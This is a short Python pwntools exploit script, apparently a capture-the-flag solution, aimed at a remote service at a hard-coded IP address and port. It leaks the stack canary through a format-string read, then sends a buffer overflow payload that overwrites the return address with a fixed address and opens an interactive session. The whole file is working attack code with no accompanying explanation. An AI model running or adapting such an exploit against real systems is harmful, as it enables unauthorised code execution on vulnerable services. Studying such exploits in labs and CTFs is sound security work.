from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

# p = process('../file/22e2d7579d2d4359a5a1735edddef631')
p = remote('61.147.171.105', '56534')

input('continue?')

p.sendlineafter(b'battle \n', b'2')
p.sendline(b'%23$lx') # 偏移量：18 + 5

canary_value = int(p.recvline()[:16], 16)
print(canary_value)

payload = flat(
    b'a' * 0x88,
    canary_value,
    0, # rbp
    0x004008da # 返回地址
)
p.sendlineafter(b'battle \n', b'1')
p.sendline(payload)

p.interactive()